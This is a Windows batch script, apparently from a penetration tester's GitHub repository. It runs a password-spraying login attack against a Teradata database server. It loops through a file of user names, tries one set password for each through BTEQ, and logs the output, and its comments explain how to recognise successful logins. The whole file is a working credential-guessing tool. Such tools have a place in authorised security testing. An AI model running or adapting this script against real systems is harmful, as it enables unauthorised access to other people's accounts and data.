@ECHO OFF
REM teradata-login.bat by Ted R (github: actuated)
REM Created 10/3/2016, Last Modified 10/3/2016
REM
REM Simple login script for Teradata, using BTEQ.
REM Note that successful logins will hang, waiting for a BTEQ command. Time
REM stamps have been provided to make this easy to notice. You can then enter
REM the .QUIT command to end that iteration of the FOR loop and continue the
REM login attack.
REM
REM Failed login: *** Failure 8017 The UserId, Password or Account is invalid.
REM Successful login: *** Logon successfully completed.

SET strINFILE=***SETME***
SET strOUTFILE=***SETME***
SET strSERVER=***SETME***
SET strPASS=***SETME***

ECHO.
ECHO ================[ teradata-login.bat - Ted R (github: actuated) ]================
IF EXIST %strOUTFILE% (
	ECHO.
	ECHO FYI: %strOUTFILE% already exists. Continue to append, or Ctrl+C to exit.
	PAUSE
)
ECHO.
ECHO. >> %strOUTFILE%
ECHO Started: %date% %time%
ECHO Started: %date% %time% >> %strOUTFILE%
ECHO.

for /f %%i in (%strINFILE%) do (
	echo %time%: %%i:%strPASS%
	bteq .LOGON %strSERVER%/%%i,%strPASS%^;ABORT^;.QUIT >> %strOUTFILE% 2>NUL
)

ECHO.
ECHO. >> %strOUTFILE%
ECHO Done: %date% %time%
ECHO Done: %date% %time% >> %strOUTFILE%
ECHO.
ECHO =====================================[ fin ]=====================================
ECHO.
